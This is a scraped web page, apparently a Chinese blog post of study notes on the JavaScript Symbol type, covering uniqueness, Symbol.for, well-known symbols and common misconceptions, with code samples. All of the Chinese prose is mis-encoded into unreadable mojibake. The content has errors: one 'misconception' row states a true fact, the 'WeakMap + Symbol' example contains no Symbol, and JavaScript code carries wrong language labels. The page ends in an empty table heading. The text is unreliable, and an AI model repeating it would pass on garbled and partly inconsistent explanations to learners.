                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸŒŸ JavaScript <code>Symbol</code> å…¨é¢å­¦ä¹ ç¬”è®°ï¼ˆES6+ï¼‰</h2>
<blockquote>
<p>âœ… <strong>ä¸€å¥è¯å®šä¹‰</strong>ï¼š<br/>
<code>Symbol</code> æ˜¯ ES6 å¼•å…¥çš„<strong>ç¬¬ä¸ƒç§åŸå§‹æ•°æ®ç±»å‹</strong>ï¼ˆPrimitive Typeï¼‰ï¼Œç”¨äºåˆ›å»º<strong>å”¯ä¸€ã€ä¸å¯å˜ã€åŒ¿åçš„æ ‡è¯†ç¬¦</strong>ï¼Œä¸»è¦è§£å†³å¯¹è±¡å±æ€§åå†²çªé—®é¢˜ï¼Œå¹¶æ”¯æŒå…ƒç¼–ç¨‹èƒ½åŠ›ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">ä¸€ã€åŸºç¡€è®¤çŸ¥ï¼šå®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</h3>





















<table><thead><tr><th>ç»´åº¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>æ•°æ®ç±»å‹</strong></td><td>åŸå§‹ç±»å‹ï¼ˆ<code>typeof Symbol() === 'symbol'</code>ï¼‰ âœ… ä¸ <code>string</code>/<code>number</code>/<code>boolean</code>/<code>null</code>/<code>undefined</code>/<code>bigint</code> å¹¶åˆ—ï¼ˆå…± 7 ç§ï¼‰ âŒ ä¸æ˜¯å¯¹è±¡ï¼ˆ<code>new Symbol()</code> æŠ¥é”™ï¼‰</td></tr><tr><td><strong>åˆ›å»ºæ–¹å¼</strong></td><td><code>Symbol([description])</code> â€”â€” <strong>å‡½æ•°è°ƒç”¨ï¼Œéæ„é€ å‡½æ•°</strong> â€¢ <code>description</code>ï¼ˆå¯é€‰ï¼‰ï¼šä»…ç”¨äºè°ƒè¯•æ˜¾ç¤ºçš„å­—ç¬¦ä¸²æè¿°ï¼Œ<strong>ä¸å½±å“å”¯ä¸€æ€§</strong> â€¢ æ¯æ¬¡è°ƒç”¨ <code>Symbol()</code> éƒ½è¿”å›<strong>å…¨æ–°ä¸”ä¸ç›¸ç­‰</strong>çš„å€¼</td></tr><tr><td><strong>å”¯ä¸€æ€§ä¿è¯</strong></td><td>âœ… <code>Symbol() !== Symbol()</code>ï¼ˆå³ä½¿ description ç›¸åŒï¼‰ âœ… <code>Symbol('a') !== Symbol('a')</code> â€”â€” <strong>æè¿°ç›¸åŒ â‰  å€¼ç›¸åŒ</strong></td></tr></tbody></table>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">s1</span> = Symbol(<span class="hljs-string">'id'</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">s2</span> = Symbol(<span class="hljs-string">'id'</span>)<span class="hljs-comment">;</span>
console.log(<span class="hljs-attr">s1</span> === s2)<span class="hljs-comment">; // false âœ…</span>
console.log(s1.toString())<span class="hljs-comment">; // "Symbol(id)"</span>
console.log(s2.toString())<span class="hljs-comment">; // "Symbol(id)"</span>
</code></pre>
<hr/>
<h3 data-id="heading-2">äºŒã€æ ¸å¿ƒç‰¹æ€§ä¸ç”¨é€”</h3>
<h4 data-id="heading-3">âœ… 1. ä½œä¸ºå¯¹è±¡çš„<strong>ç§æœ‰/éšè—å±æ€§é”®ï¼ˆKeyï¼‰</strong></h4>
<ul>
<li>è§£å†³å¤šäººåä½œä¸­å¯¹è±¡å±æ€§åå†²çªé—®é¢˜ï¼ˆå¦‚ <code>user.id</code> vs <code>user.id</code> è¢«è¦†ç›–ï¼‰</li>
<li><code>Symbol</code> é”®<strong>ä¸ä¼šè¢«å¸¸è§„éå†æ–¹æ³•æšä¸¾</strong>ï¼Œå®ç°â€œå¼±ç§æœ‰â€è¯­ä¹‰</li>
</ul>








































<table><thead><tr><th>éå†æ–¹å¼</th><th>æ˜¯å¦è®¿é—® Symbol é”®</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>for...in</code></td><td>âŒ</td><td>ä»…éå†å¯æšä¸¾çš„<strong>å­—ç¬¦ä¸²é”®</strong></td></tr><tr><td><code>Object.keys()</code></td><td>âŒ</td><td>åŒä¸Š</td></tr><tr><td><code>Object.getOwnPropertyNames()</code></td><td>âŒ</td><td>ä»…è¿”å›å­—ç¬¦ä¸²é”®ï¼ˆå«ä¸å¯æšä¸¾ï¼‰</td></tr><tr><td><code>JSON.stringify()</code></td><td>âŒ</td><td>å¿½ç•¥ Symbol é”®</td></tr><tr><td><code>Object.getOwnPropertySymbols()</code></td><td>âœ…</td><td><strong>å”¯ä¸€æ ‡å‡†æ–¹æ³•è·å–æ‰€æœ‰ Symbol é”®</strong></td></tr><tr><td><code>Reflect.ownKeys()</code></td><td>âœ…</td><td>è¿”å›æ‰€æœ‰é”®ï¼ˆå­—ç¬¦ä¸² + Symbolï¼‰</td></tr></tbody></table>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> secret = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'password'</span>);
<span class="hljs-keyword">const</span> user = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'å¼ ä¸‰'</span>,
  <span class="hljs-attr">email</span>: <span class="hljs-string">'zhang@example.com'</span>,
  [secret]: <span class="hljs-string">'123456'</span> <span class="hljs-comment">// éšè—å¯†é’¥</span>
};

<span class="hljs-comment">// âœ… å®‰å…¨è®¿é—®</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user[secret]); <span class="hljs-comment">// "123456"</span>

<span class="hljs-comment">// âŒ ä¸ä¼šè¢«æ„å¤–è¦†ç›–æˆ–æš´éœ²</span>
user.<span class="hljs-property">secret</span> = <span class="hljs-string">'hacked'</span>; <span class="hljs-comment">// æ–°å¢å­—ç¬¦ä¸²é”®ï¼Œä¸å½±å“ Symbol é”®</span>

<span class="hljs-comment">// ğŸ” æŸ¥çœ‹ Symbol é”®ï¼ˆéœ€ä¸»åŠ¨è°ƒç”¨ï¼‰</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(user)); <span class="hljs-comment">// [Symbol(password)]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(user)); <span class="hljs-comment">// ['name', 'email', Symbol(password)]</span>
</code></pre>
<h4 data-id="heading-4">âœ… 2. å…¨å±€æ³¨å†Œè¡¨ï¼š<code>Symbol.for()</code> ä¸ <code>Symbol.keyFor()</code></h4>
<p>å½“éœ€è¦<strong>è·¨æ¨¡å—å…±äº«åŒä¸€ä¸ª Symbol</strong> æ—¶ä½¿ç”¨ï¼ˆé¿å…é‡å¤åˆ›å»ºï¼‰ï¼š</p>




















<table><thead><tr><th>æ–¹æ³•</th><th>ä½œç”¨</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>Symbol.for(key)</code></td><td>åœ¨<strong>å…¨å±€ Symbol æ³¨å†Œè¡¨</strong>ä¸­æŸ¥æ‰¾/åˆ›å»º Symbol âœ… åŒ key â†’ åŒ Symbol</td><td><code>Symbol.for('shared') === Symbol.for('shared') // true</code></td></tr><tr><td><code>Symbol.keyFor(sym)</code></td><td>è¿”å›è¯¥ Symbol åœ¨æ³¨å†Œè¡¨ä¸­çš„ keyï¼ˆä»…å¯¹ <code>for()</code> åˆ›å»ºçš„ç”Ÿæ•ˆï¼‰</td><td><code>Symbol.keyFor(Symbol.for('shared')) // 'shared'</code></td></tr></tbody></table>
<p>âš ï¸ æ³¨æ„ï¼š<code>Symbol('a')</code> å’Œ <code>Symbol.for('a')</code> <strong>å®Œå…¨ä¸åŒ</strong>ï¼</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'a'</span>) === <span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">for</span>(<span class="hljs-string">'a'</span>)); <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">for</span>(<span class="hljs-string">'a'</span>) === <span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">for</span>(<span class="hljs-string">'a'</span>)); <span class="hljs-comment">// true</span>
</code></pre>
<h4 data-id="heading-5">âœ… 3. å†…ç½® Symbolï¼ˆWell-known Symbolsï¼‰â€”â€” å®ç°åè®®æ¥å£</h4>
<p>ES6 å®šä¹‰äº†ä¸€ç³»åˆ—ä»¥ <code>Symbol.</code> å¼€å¤´çš„<strong>é¢„è®¾ Symbol å€¼</strong>ï¼Œç”¨äºè‡ªå®šä¹‰å¯¹è±¡è¡Œä¸ºï¼ˆé¸­å­ç±»å‹åè®®ï¼‰ï¼š</p>















































<table><thead><tr><th>Symbol</th><th>ä½œç”¨</th><th>è§¦å‘åœºæ™¯</th><th>ç¤ºä¾‹ç®€å†™</th></tr></thead><tbody><tr><td><code>Symbol.iterator</code></td><td>å®šä¹‰å¯¹è±¡çš„é»˜è®¤è¿­ä»£å™¨</td><td><code>for...of</code>, <code>[...obj]</code>, <code>Array.from()</code></td><td><code>obj[Symbol.iterator] = function*(){...}</code></td></tr><tr><td><code>Symbol.toStringTag</code></td><td>è‡ªå®šä¹‰ <code>Object.prototype.toString.call(obj)</code> è¾“å‡º</td><td><code>Object.prototype.toString.call(obj)</code></td><td><code>obj[Symbol.toStringTag] = 'MyClass'</code> â†’ <code>"[object MyClass]"</code></td></tr><tr><td><code>Symbol.hasInstance</code></td><td>è‡ªå®šä¹‰ <code>instanceof</code> è¡Œä¸º</td><td><code>obj instanceof Constructor</code></td><td><code>class MyClass { static [Symbol.hasInstance](x) { return x?.custom === true; } }</code></td></tr><tr><td><code>Symbol.isConcatSpreadable</code></td><td>æ§åˆ¶ <code>Array.prototype.concat()</code> æ˜¯å¦å±•å¼€</td><td><code>[].concat(arr)</code></td><td><code>arr[Symbol.isConcatSpreadable] = false</code></td></tr><tr><td><code>Symbol.toPrimitive</code></td><td>å®šä¹‰å¯¹è±¡è½¬åŸå§‹å€¼é€»è¾‘ï¼ˆ<code>+</code>, <code>==</code>, <code>String()</code> ç­‰ï¼‰</td><td><code>obj + 1</code>, <code>String(obj)</code></td><td><code>obj[Symbol.toPrimitive] = (hint) =&gt; hint === 'number' ? 42 : 'foo'</code></td></tr><tr><td><code>Symbol.unscopables</code></td><td>æŒ‡å®š <code>with</code> è¯­å¥ä¸­å±è”½çš„å±æ€§ï¼ˆå·²åºŸå¼ƒä½†éœ€äº†è§£ï¼‰</td><td><code>with(obj){ prop }</code></td><td><code>obj[Symbol.unscopables] = { prop: true }</code></td></tr></tbody></table>
<blockquote>
<p>ğŸ’¡ è¿™äº›æ˜¯ JS <strong>å…ƒç¼–ç¨‹ï¼ˆMetaprogrammingï¼‰</strong> çš„åŸºçŸ³ï¼Œè®©å¯¹è±¡èƒ½â€œå‚ä¸è¯­è¨€çº§åè®®â€ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-6">ä¸‰ã€é‡è¦æ³¨æ„äº‹é¡¹ä¸å¸¸è§è¯¯åŒº</h3>



































<table><thead><tr><th>è¯¯åŒº</th><th>æ­£ç¡®ç†è§£</th><th>ä¸ºä»€ä¹ˆé‡è¦</th></tr></thead><tbody><tr><td>âŒ <code>Symbol</code> æ˜¯â€œç§æœ‰å±æ€§â€</td><td>âš ï¸ <strong>ä¸æ˜¯çœŸæ­£ç§æœ‰</strong>ï¼š â€¢ å¯é€šè¿‡ <code>Object.getOwnPropertySymbols()</code> è·å– â€¢ å¯é€šè¿‡ <code>Reflect.ownKeys()</code> è·å– â€¢ <code>JSON.stringify()</code> ä¼šå¿½ç•¥ï¼Œä½† <code>console.log()</code> ä»å¯è§</td><td>é¿å…è¯¯ä»¥ä¸º Symbol=privateï¼Œå®é™…æ˜¯â€œä¸æ˜“è¢«æ„å¤–è®¿é—®â€ï¼Œéå®‰å…¨éš”ç¦»</td></tr><tr><td>âŒ <code>Symbol</code> å¯ä»¥éšå¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²</td><td>âŒ <strong>Symbol ä¸èƒ½éšå¼è½¬æ¢</strong>ï¼š <code>'' + Symbol()</code> â†’ TypeError <code>String(Symbol())</code> âœ… æ˜¾å¼è½¬æ¢</td><td>é˜²æ­¢é™é»˜é”™è¯¯ï¼Œå¼ºåˆ¶å¼€å‘è€…æ˜¾å¼å¤„ç†</td></tr><tr><td>âŒ æ‰€æœ‰ Symbol éƒ½æ˜¯å…¨å±€å”¯ä¸€çš„</td><td>âš ï¸ <code>Symbol.for()</code> åˆ›å»ºçš„æ˜¯<strong>å…¨å±€æ³¨å†Œçš„ Symbol</strong>ï¼Œ<code>Symbol()</code> æ‰æ˜¯ç»å¯¹å”¯ä¸€</td><td>æ··æ·†äºŒè€…ä¼šå¯¼è‡´é¢„æœŸå¤–çš„ç›¸ç­‰æ€§ï¼ˆå¦‚è¯¯ä»¥ä¸º <code>Symbol('a') === Symbol.for('a')</code>ï¼‰</td></tr><tr><td>âŒ Symbol é”®åœ¨ <code>Object.assign()</code> ä¸­ä¼šè¢«å¿½ç•¥</td><td>âœ… <strong>ä¼šè¢«å¤åˆ¶</strong>ï¼ <code>Object.assign({}, obj)</code> ä¼šå¤åˆ¶ Symbol é”®</td><td>ä¸ <code>JSON.stringify()</code> ä¸åŒï¼Œéœ€æ³¨æ„æ·±æ‹·è´å…¼å®¹æ€§</td></tr><tr><td>âŒ <code>Symbol</code> å¯ä»¥ä½œä¸º <code>Map</code> / <code>WeakMap</code> çš„é”®</td><td>âœ… <strong>å®Œå…¨æ”¯æŒ</strong>ï¼Œä¸”æ˜¯ç†æƒ³é€‰æ‹©ï¼š <code>map.set(Symbol(), value)</code> â€”â€” æ— å†²çªã€æ— æ³„æ¼é£é™©</td><td><code>WeakMap</code> + <code>Symbol</code> æ˜¯å®ç°çœŸæ­£ç§æœ‰çŠ¶æ€çš„ç»å…¸ç»„åˆ</td></tr></tbody></table>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âœ… WeakMap + Symbol å®ç°â€œçœŸç§æœ‰â€</span>
<span class="hljs-keyword">const</span> privateData = new WeakMap();
<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-keyword">constructor</span>(name) {
    privateData.<span class="hljs-keyword">set</span>(<span class="hljs-keyword">this</span>, { name }); <span class="hljs-comment">// å­˜å‚¨ç§æœ‰æ•°æ®</span>
  }
  getName() {
    <span class="hljs-keyword">return</span> privateData.<span class="hljs-keyword">get</span>(<span class="hljs-keyword">this</span>)?.name;
  }
}
</code></pre>
<hr/>
<h3 data-id="heading-7">å››ã€ä¸å…¶ä»–æ•°æ®ç±»å‹çš„å¯¹æ¯”é€ŸæŸ¥è¡¨</h3>






















































<table><thead><tr><th>ç‰¹æ€§</th><th><code>Symbol</code></th><th><code>String</code></th><th><code>Number</code></th><th><code>Object</code></th></tr></thead><tbody><tr><td>ç±»å‹</td><td>Primitive</td><td>Primitive</td><td>Primitive</td><td>Reference</td></tr><tr><td>å”¯ä¸€æ€§</td><td>âœ… æ¯æ¬¡è°ƒç”¨æ–°å€¼</td><td>âŒ å­—ç¬¦ä¸²å€¼ç›¸ç­‰å³ç›¸ç­‰</td><td>âŒ æ•°å€¼ç›¸ç­‰å³ç›¸ç­‰</td><td>âŒ å¼•ç”¨ä¸åŒå³ä¸ç­‰</td></tr><tr><td>å¯æšä¸¾æ€§</td><td>âŒ ä¸è¢« <code>for...in</code> / <code>keys()</code> æšä¸¾</td><td>âœ…</td><td>âœ…</td><td>âœ…ï¼ˆè‡ªèº«å¯æšä¸¾å±æ€§ï¼‰</td></tr><tr><td>å¯ä½œä¸ºå¯¹è±¡é”®</td><td>âœ…</td><td>âœ…</td><td>âœ…ï¼ˆè‡ªåŠ¨è½¬å­—ç¬¦ä¸²ï¼‰</td><td>âœ…ï¼ˆè‡ªåŠ¨è½¬å­—ç¬¦ä¸²ï¼‰</td></tr><tr><td>å¯åºåˆ—åŒ–ï¼ˆJSONï¼‰</td><td>âŒï¼ˆè¢«å¿½ç•¥ï¼‰</td><td>âœ…</td><td>âœ…</td><td>âœ…ï¼ˆä»…å¯æšä¸¾è‡ªæœ‰å±æ€§ï¼‰</td></tr><tr><td>å¯éšå¼è½¬æ¢</td><td>âŒï¼ˆTypeErrorï¼‰</td><td>âœ…ï¼ˆ<code>+str</code>, <code>str + ''</code>ï¼‰</td><td>âœ…</td><td>âœ…ï¼ˆ<code>toString()</code>/<code>valueOf()</code>ï¼‰</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-8">äº”ã€æœ€ä½³å®è·µå»ºè®®</h3>
<ol>
<li>
<p><strong>å‘½åå†²çªé˜²æŠ¤</strong>ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">MY_LIB_PREFIX</span> = Symbol(<span class="hljs-string">'my-lib'</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">config</span> = { [MY_LIB_PREFIX]: { debug: <span class="hljs-literal">true</span> } }<span class="hljs-comment">;</span>
</code></pre>
</li>
<li>
<p><strong>å¸¸é‡å®šä¹‰ï¼ˆæ›¿ä»£å­—ç¬¦ä¸²å¸¸é‡ï¼‰</strong> ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">STATUS</span> = {
  <span class="hljs-attr">PENDING</span>: <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'PENDING'</span>),
  <span class="hljs-attr">FULFILLED</span>: <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'FULFILLED'</span>),
  <span class="hljs-attr">REJECTED</span>: <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'REJECTED'</span>)
};
<span class="hljs-comment">// âœ… æ¯”å­—ç¬¦ä¸²æ›´å®‰å…¨ï¼šSTATUS.PENDING !== 'PENDING'</span>
</code></pre>
</li>
<li>
<p><strong>é…åˆ <code>WeakMap</code> å®ç°ç§æœ‰çŠ¶æ€</strong>ï¼ˆè§ä¸Šæ–‡ï¼‰ã€‚</p>
</li>
<li>
<p><strong>æ…ç”¨ <code>Symbol.for()</code></strong> ï¼šä»…åœ¨<strong>æ˜ç¡®éœ€è¦è·¨æ¨¡å—å…±äº« Symbol</strong> æ—¶ä½¿ç”¨ï¼Œé¿å…æ±¡æŸ“å…¨å±€æ³¨å†Œè¡¨ã€‚</p>
</li>
<li>
<p><strong>è°ƒè¯•æŠ€å·§</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨ <code>Symbol.description</code> è·å–æè¿°ï¼ˆ<code>s.description === 'id'</code>ï¼‰</li>
<li><code>console.log(s)</code> æ˜¾ç¤º <code>Symbol(id)</code>ï¼Œä¾¿äºè¯†åˆ«</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-9">å…­ã€å»¶ä¼¸æ€è€ƒï¼šä¸ºä»€ä¹ˆéœ€è¦ Symbolï¼Ÿ</h3>






























<table><thead><tr><th>é—®é¢˜</th><th>ä¼ ç»Ÿæ–¹æ¡ˆç¼ºé™·</th><th><code>Symbol</code> è§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td>å¯¹è±¡å±æ€§åå†²çª</td><td>å¤šäººåä½œæ—¶ <code>user.id</code> å¯èƒ½è¢«è¦†ç›–</td><td><code>user[Symbol('id')]</code> ç¡®ä¿å”¯ä¸€</td></tr><tr><td>éœ€è¦â€œéšè—â€é…ç½®é¡¹</td><td>ç”¨ <code>_</code> å‰ç¼€ï¼ˆçº¦å®šä¿—æˆï¼Œä¸å¼ºåˆ¶ï¼‰</td><td><code>Symbol</code> é”®å¤©ç„¶ä¸è¢«å¸¸è§„éå†å‘ç°</td></tr><tr><td>è‡ªå®šä¹‰å¯¹è±¡è¡Œä¸ºï¼ˆè¿­ä»£ã€è½¬æ¢ç­‰ï¼‰</td><td>æ— æ³•å¹²é¢„è¯­è¨€å†…ç½®æ“ä½œ</td><td>å†…ç½® Symbol åè®®æä¾›æ ‡å‡†é’©å­</td></tr><tr><td>Map é”®éœ€å”¯ä¸€ä¸”æ— å“ˆå¸Œç¢°æ’</td><td>å­—ç¬¦ä¸²é”®å¯èƒ½é‡å¤ï¼Œå¯¹è±¡é”®ä¼šè½¬å­—ç¬¦ä¸²</td><td><code>Symbol</code> ä½œä¸ºé”®æ—¢å”¯ä¸€åˆé«˜æ•ˆ</td></tr></tbody></table>
<blockquote>
<p>âœ… <strong>æœ¬è´¨</strong>ï¼š<code>Symbol</code> æ˜¯ JS ä¸º<strong>å…ƒç¼–ç¨‹</strong>å’Œ<strong>å®‰å…¨æ‰©å±•</strong>è€Œè®¾è®¡çš„åº•å±‚åŸè¯­ï¼Œæ˜¯è¯­è¨€æ¼”è¿›çš„å…³é”®ä¸€æ­¥ã€‚</p>
</blockquote>
<hr/>
<p>ğŸ“Œ <strong>é™„ï¼šå¿«é€Ÿæµ‹è¯•ä»£ç ï¼ˆå¯ç›´æ¥è¿è¡Œï¼‰</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// éªŒè¯å”¯ä¸€æ€§</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Symbol</span>() === <span class="hljs-title class_">Symbol</span>()); <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'a'</span>) === <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'a'</span>)); <span class="hljs-comment">// false</span>

<span class="hljs-comment">// éªŒè¯ä¸å¯æšä¸¾æ€§</span>
<span class="hljs-keyword">const</span> obj = { <span class="hljs-attr">str</span>: <span class="hljs-string">'hello'</span>, [<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'sym'</span>)]: <span class="hljs-string">'world'</span> };
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(obj)); <span class="hljs-comment">// ['str']</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(obj)); <span class="hljs-comment">// [Symbol(sym)]</span>

<span class="hljs-comment">// éªŒè¯å…¨å±€æ³¨å†Œ</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">for</span>(<span class="hljs-string">'test'</span>) === <span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">for</span>(<span class="hljs-string">'test'</span>)); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">for</span>(<span class="hljs-string">'test'</span>) === <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'test'</span>)); <span class="hljs-comment">// false</span>
</code></pre>
<hr/>
<h3 data-id="heading-10">Â è¡¥å……çŸ¥è¯†ç‚¹</h3>
<h3 data-id="heading-11">ä¸ºä»€ä¹ˆå¿…é¡»å†™Â <code>[secret]</code>ï¼Ÿâ€”â€” ç ´è§£ä½ å¿ƒä¸­çš„æ ¸å¿ƒå›°æƒ‘</h3>
<p>ä½ ä»£ç ä¸­è¿™ä¸¤è¡Œæ˜¯ç†è§£ Symbol çš„åˆ†æ°´å²­ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">secret</span> = Symbol(<span class="hljs-string">'password'</span>)<span class="hljs-comment">;     // âœ… åˆ›å»ºä¸€ä¸ª Symbol å®ä¾‹ï¼Œå­˜å…¥å˜é‡ secret</span>

// âŒ é”™è¯¯ï¼š{ secret: '123' } â†’ åˆ›å»ºå­—ç¬¦ä¸²é”® 'secret'
const <span class="hljs-attr">user1</span> = { secret: <span class="hljs-string">'123'</span> }<span class="hljs-comment">;</span>

// âœ… æ­£ç¡®ï¼š{ <span class="hljs-section">[secret]</span>: '123' } â†’ ä½¿ç”¨å˜é‡ secret çš„å€¼ï¼ˆå³ Symbolï¼‰ä½œä¸ºé”®
const <span class="hljs-attr">user2</span> = { [secret]: <span class="hljs-string">'123'</span> }<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-12">ğŸ” æ·±åº¦è§£æï¼šæ–¹æ‹¬å·Â <code>[ ]</code>Â æ˜¯å”¯ä¸€â€œå¼€é—¨é’¥åŒ™â€</h4>
<p>è¡¨æ ¼</p>























